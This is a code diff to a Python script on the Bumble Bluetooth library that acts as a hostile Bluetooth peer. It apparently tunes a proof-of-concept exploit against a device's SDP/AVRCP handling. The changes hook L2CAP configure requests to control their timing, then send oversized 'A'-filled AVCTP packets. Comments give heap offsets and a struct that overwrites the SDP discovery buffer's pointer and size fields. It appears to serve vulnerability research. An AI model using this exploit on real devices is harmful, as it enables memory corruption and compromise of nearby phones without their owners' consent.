@@ -2,7 +2,7 @@ import asyncio
 import struct
 
 import bumble.logging
-from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp
+from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp, l2cap
 from bumble.colors import color
 from bumble.device import Connection, Device, DeviceConfiguration
 from bumble.l2cap import ClassicChannelSpec
@@ -111,11 +111,33 @@ async def main():
         await asyncio.sleep(0.5)
         channel = await rfcomm_mux.open_dlc(4)
         await asyncio.sleep(0.5)
+
+        configure_requests = []
+
+        def my_on_configure_request_hook(request):
+            print("configure - waiting", request)
+            configure_requests.append(request)
+
+        def event_connection_handler(channel):
+            print("got channel, hooking...")
+            channel.orig_on_configure_request = channel.on_configure_request
+            channel.on_configure_request = my_on_configure_request_hook
+
+        device.l2cap_channel_manager.servers[sdp.SDP_PSM].on(
+            l2cap.ClassicChannelServer.EVENT_CONNECTION,
+            event_connection_handler)
+
         device.sdp_server.send_response(
             sdp.SDP_ErrorResponse(
                 transaction_id=requests[0].transaction_id,
                 error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
             ))
+        await asyncio.sleep(0.5)
+        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
+            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
+                           0x4141, b"A" * 0x100))
+        device.sdp_server.channel.orig_on_configure_request(
+            configure_requests[0])
         await asyncio.sleep(0.5)
         # with 0xef as my filler:
         # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
@@ -123,12 +145,12 @@ async def main():
         buf_offset = 0x13
         tSDP_DISCOVERY_DB_raw_data_offset = 0x70
         # raw_data, raw_size, raw_used
-        avrcp_command_buf = b"A" * (
-            tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
-                "<QII", 0x41414141_41414141, 0x41414141, 0x0) + b"\xef" * 0x80
-        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
-            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
-                           0x4141, avrcp_command_buf))
+        #avrcp_command_buf = b"A" * (
+        #    tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
+        #        "<QII", 0x41414141_41414141, 0x41414141, 0x0) + b"\xef" * 0x80
+        #avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
+        #    AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
+        #                   0x4141, avrcp_command_buf))
         device.sdp_server.send_response(
             sdp.SDP_ServiceSearchAttributeResponse(
                 transaction_id=requests[1].transaction_id,
